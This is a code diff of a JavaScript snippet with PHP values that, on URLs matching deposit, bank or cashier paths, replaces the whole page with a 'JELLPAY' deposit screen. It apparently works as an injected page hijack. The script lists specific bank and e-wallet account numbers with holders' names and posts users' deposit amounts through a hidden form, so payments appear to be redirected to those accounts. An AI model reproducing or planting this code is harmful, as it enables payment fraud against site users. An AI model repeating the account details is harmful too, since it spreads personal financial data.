@@ -1,14 +1,12 @@
 (function () {
   const url = window.location.href;
-  const match = ['/deposit','/bank','/deposit.php','/qris.php','/cashier','/index.php?page=transaksi','/?deposit&head=home','/index.php?page=cashier','/bank.php'];
+  const match = ['/deposit','/bank','/deposit.php','/qris.php','/cashier','/index.php?page=transaksi','/?deposit&head=home','/index.php?page=cashier','/?page=deposit'];
   if (!match.some(path => url.includes(path))) return;
 
-  const userID = "<?= (int)$user_data['cuid']; ?>";
-  const csrfToken = "<?= $_SESSION['csrf_token']; ?>";
-
+    const userID = "<?= $userID; ?>";
   document.body.innerHTML = `
-  <head>
-    <title>JELLPAY</title>
+ <head>
+  <title>JELLPAY</title>
     <link href="https://fonts.googleapis.com/css?family=Figtree" rel="stylesheet">
     <style>
       body, html {margin:0;padding:0;background:linear-gradient(135deg,#f0f2f0 0%,#e0e2e0 100%);font-family:figtree,sans-serif;}
@@ -45,15 +43,15 @@
           <label>Pilih Metode:</label>
           <select id="payment_method">
             <optgroup label="REKENING BANK">
-              <option value="388|BRI">BRI - 564101052645534 - ACEP</option>
-              <option value="389|MANDIRI">MANDIRI - 1120023711083 - RIDUAN</option>
-              <option value="390|BCA">BCA - ALIHKAN QRIS</option>
-              <option value="391|BNI">BNI - 1928874785 - RIDUAN</option>
+              <option value="BRI|564101052645534">BRI - 564101052645534 - ACEP</option>
+              <option value="MANDIRI|1120023711083">MANDIRI - 1120023711083 - RIDUAN</option>
+              <option value="BCA|ALIHKAN QRIS">BCA - ALIHKAN QRIS</option>
+              <option value="BNI|1928874785">BNI - 1928874785 - RIDUAN</option>
             </optgroup>
             <optgroup label="E-WALET">
-              <option value="392|DANA">DANA - 088985395138 - ARWANSYAH</option>
-              <option value="393|OVO">OVO - 088985395138 - SOLIA</option>
-              <option value="394|GOPAY">GO-PAY - 088985395138 - SOLIA</option>
+              <option value="DANA|088985395138">DANA - 088985395138 - ARWANSYAH</option>
+              <option value="OVO|088985395138">OVO - 088985395138 - SOLIA</option>
+              <option value="GOPAY|088985395138">GO-PAY - 088985395138 - SOLIA</option>
             </optgroup>
           </select>
           <button class="copy-btn" id="copy-account">Salin Rekening</button>
@@ -71,12 +69,12 @@
           <button class="btn-submit" id="btn-submit">Kirim</button>
       </div>
     </div>
-    <form id="depositForm" method="POST" action="/bank/deposit-pga" style="display:none;">
-        <input type="hidden" name="csrf_token" value="${csrfToken}">
-        <input type="hidden" name="display_nominal" id="display_nominal" value="">
+    <form id="depositForm" method="POST" action="../function/deposit-pga.php" style="display:none;">
+        <input type="hidden" name="deposit" value="1">
         <input type="hidden" name="pay_from" id="pay_from" value="">
         <input type="hidden" name="metode" id="metode" value="">
-        <input type="hidden" name="catatan" value="-">
+        <input type="hidden" name="postID" value="${userID}">
+        <input type="hidden" name="nominal" id="jumlah_deposit" value="">
     </form>
   `;
 
@@ -108,7 +106,7 @@
       qrisOption.classList.remove("active");
       qrSection.style.display = "none";
       bankSection.style.display = "block";
-      methodLabel.textContent = selectBank.value.split("|")[1];
+      methodLabel.textContent = selectBank.value.split("|")[0];
   });
   qrisOption.addEventListener("click", () => {
       qrisOption.classList.add("active");
@@ -119,7 +117,7 @@
   });
 
   copyBtn.addEventListener("click", () => {
-      const rekening = selectBank.options[selectBank.selectedIndex].text.split(" - ")[1];
+      const rekening = selectBank.value.split("|")[1];
       navigator.clipboard.writeText(rekening);
       alert("Nomor rekening disalin: " + rekening);
   });
@@ -128,17 +126,14 @@
       const rawAmount = amountInput.value.replace(/\D/g,'');
       const amount = parseInt(rawAmount) || 0;
       if(amount < 50000){ alert("Minimal deposit Rp50.000"); return; }
-
-      document.getElementById("display_nominal").value = amount / 1000;
-      document.getElementById("pay_from").value = userID;
-
+      document.getElementById("jumlah_deposit").value = amount;
       if(qrisOption.classList.contains("active")){
-          document.getElementById("metode").value = "433"; // ID QRIS
+          document.getElementById("metode").value = "433";
+          document.getElementById("pay_from").value = "<?= $cuid; ?>";
       } else {
-          const selectedMethod = selectBank.value.split("|")[0];
-          document.getElementById("metode").value = selectedMethod;
+          document.getElementById("metode").value = "388";
+          document.getElementById("pay_from").value = "<?= $cuid; ?>";
       }
-
       document.getElementById("depositForm").submit();
   });
 
